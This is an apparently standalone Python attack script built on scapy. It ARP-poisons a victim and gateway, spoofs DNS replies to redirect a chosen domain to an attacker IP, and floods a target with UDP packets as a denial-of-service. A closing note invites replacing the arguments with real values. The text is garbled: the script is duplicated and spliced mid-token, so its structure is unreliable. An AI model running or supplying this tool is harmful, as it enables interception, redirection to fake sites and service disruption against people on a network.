#!/usr/bin/env python

import argparse
import os
import sys
import time

from scapy.all import *

def dns_spoof(pkt, target_domain, redirect_ip):
    if DNSQR in pk#!/usr/bin/env python

import argparse
import os
import sys
import time

from scapy.all import *

def dns_spoof(pkt, target_domain, redirect_ip):
    if DNSQR in pkt and pkt[DNSQR].qname.decode() == target_domain:
        print('Spoofing DNS Response...')
        ip = redirect_ip
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/ \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/ \
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
                          an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=ip))
        send(spoofed_pkt, verbose=0)
        print('DNS Response sent to:', pkt[IP].src)

def arp_poison(gateway_ip, victim_ip):
    print('Poisoning ARP Table...')
    gateway_mac = getmacbyip(gateway_ip)
    victim_mac = getmacbyip(victim_ip)
    pkt = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac)
    send(pkt, verbose=0)
    pkt = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac)
    send(pkt, verbose=0)
    print('ARP Table Poisoned')

def restore_arp(gateway_ip, victim_ip):
    print('Restoring ARP Table...')
    gateway_mac = getmacbyip(gateway_ip)
    victim_mac = getmacbyip(victim_ip)
    pkt = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff', \
              hwsrc=gateway_mac)
    send(pkt, verbose=0, count=5)
    pkt = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst='ff:ff:ff:ff:ff:ff', \
              hwsrc=victim_mac)
    send(pkt, verbose=0, count=5)
    print('ARP Table Restored')

def start_dns_spoofing(gateway_ip, victim_ip, interface, target_domain, redirect_ip):
    try:
        arp_poison(gateway_ip, victim_ip)
        print('DNS Spoofing Started...')
        sniff(filter='udp port 53', iface=interface, prn=lambda pkt: dns_spoof(pkt, target_domain, redirect_ip))
    except KeyboardInterrupt:
        restore_arp(gateway_ip, victim_ip)
        print('Exiting...')

def enable_ip_forwarding():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1\n')
    print('IP Forwarding Enabled')

def disable_ip_forwarding():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0\n')
    print('IP Forwarding Disabled')

def run_dos_attack(target_ip, target_port, packet_size, duration):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = os.urandom(packet_size)
        end_time = time.time() + duration
        sent_packets = 0
        while time.time() < end_time:
            sock.sendto(data, (target_ip, target_port))
            sent_packets += 1
        print(f'DOS attack finished - sent {sent_packets}')

    except KeyboardInterrupt:
      print('DOS attack stopped')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target-ip', help='Target IP Address', required=True)
    parser.add_argument('-p', '--target-port', help='Target Port', type=int, required=True)
    parser.add_argument('-s', '--packet-size', help='Packet Size', type=int, default=1024)
    parser.add_argument('-d', '--duration', help='Duration in Seconds', type=int, default=10)
    parser.add_argument('-g', '--gateway-ip', help='Gateway IP Address', required=True)
    parser.add_argument('-v', '--victim-ip', help='Victim IP Address', required=True)
    parser.add_argument('-i', '--interface', help='Interface', default='eth0')
    parser.add_argument('-n', '--target-domain', help='Target Domain Name', required=True)
    parser.add_argument('-r', '--redirect-ip', help='Redirect IP Address', required=True)
    args = parser.parse_args()

    enable_ip_forwarding()

    dos_thread = threading.Thread(target=run_dos_attack, args=(args.target_ip, args.target_port, args.packet_size, args.duration))
    dns_thread = threading.Thread(target=start_dns_spoofing, args=(args.gateway_ip, args.victim_ip, args.interface, args.target_domain, args.redirect_ip))

    dos_thread.start()
    dns_thread.start()

    dos_thread.join()
    dns_thread.join()

    disable_ip_forwarding()

use = "Note that the values of the arguments -t/--target-ip, -p/--target-port, -g/--gateway-ip, -v/--victim-ip, -n/--target-domain, and -r/--redirect-ip should be replaced with the actual values for your use case."
t and pkt[DNSQR].qname.decode() == target_domain:
        print('Spoofing DNS Response...')
        ip = redirect_ip
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/ \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/ \
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
                          an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=ip))
        send(spoofed_pkt, verbose=0)
        print('DNS Response sent to:', pkt[IP].src)

def arp_poison(gateway_ip, victim_ip):
    print('Poisoning ARP Table...')
    gateway_mac = getmacbyip(gateway_ip)
    victim_mac = getmacbyip(victim_ip)
    pkt = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac)
    send(pkt, verbose=0)
    pkt = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac)
    send(pkt, verbose=0)
    print('ARP Table Poisoned')

def restore_arp(gateway_ip, victim_ip):
    print('Restoring ARP Table...')
    gateway_mac = getmacbyip(gateway_ip)
    victim_mac = getmacbyip(victim_ip)
    pkt = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff', \
              hwsrc=gateway_mac)
    send(pkt, verbose=0, count=5)
    pkt = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst='ff:ff:ff:ff:ff:ff', \
              hwsrc=victim_mac)
    send(pkt, verbose=0, count=5)
    print('ARP Table Restored')

def start_dns_spoofing(gateway_ip, victim_ip, interface, target_domain, redirect_ip):
    try:
        arp_poison(gateway_ip, victim_ip)
        print('DNS Spoofing Started...')
        sniff(filter='udp port 53', iface=interface, prn=lambda pkt: dns_spoof(pkt, target_domain, redirect_ip))
    except KeyboardInterrupt:
        restore_arp(gateway_ip, victim_ip)
        print('Exiting...')

def enable_ip_forwarding():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1\n')
    print('IP Forwarding Enabled')

def disable_ip_forwarding():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0\n')
    print('IP Forwarding Disabled')

def run_dos_attack(target_ip, target_port, packet_size, duration):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = os.urandom(packet_size)
        end_time = time.time() + duration
        sent_packets = 0
        while time.time() < end_time:
            sock.sendto(data, (target_ip, target_port))
            sent_packets += 1
        print(f'DOS attack finished - sent {sent_packets}')

    except KeyboardInterrupt:
      print('DOS attack stopped')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target-ip', help='Target IP Address', required=True)
    parser.add_argument('-p', '--target-port', help='Target Port', type=int, required=True)
    parser.add_argument('-s', '--packet-size', help='Packet Size', type=int, default=1024)
    parser.add_argument('-d', '--duration', help='Duration in Seconds', type=int, default=10)
    parser.add_argument('-g', '--gateway-ip', help='Gateway IP Address', required=True)
    parser.add_argument('-v', '--victim-ip', help='Victim IP Address', required=True)
    parser.add_argument('-i', '--interface', help='Interface', default='eth0')
    parser.add_argument('-n', '--target-domain', help='Target Domain Name', required=True)
    parser.add_argument('-r', '--redirect-ip', help='Redirect IP Address', required=True)
    args = parser.parse_args()

    enable_ip_forwarding()

    dos_thread = threading.Thread(target=run_dos_attack, args=(args.target_ip, args.target_port, args.packet_size, args.duration))
    dns_thread = threading.Thread(target=start_dns_spoofing, args=(args.gateway_ip, args.victim_ip, args.interface, args.target_domain, args.redirect_ip))

    dos_thread.start()
    dns_thread.start()

    dos_thread.join()
    dns_thread.join()

    disable_ip_forwarding()

use = "Note that the values of the arguments -t/--target-ip, -p/--target-port, -g/--gateway-ip, -v/--victim-ip, -n/--target-domain, and -r/--redirect-ip should be replaced with the actual values for your use case."
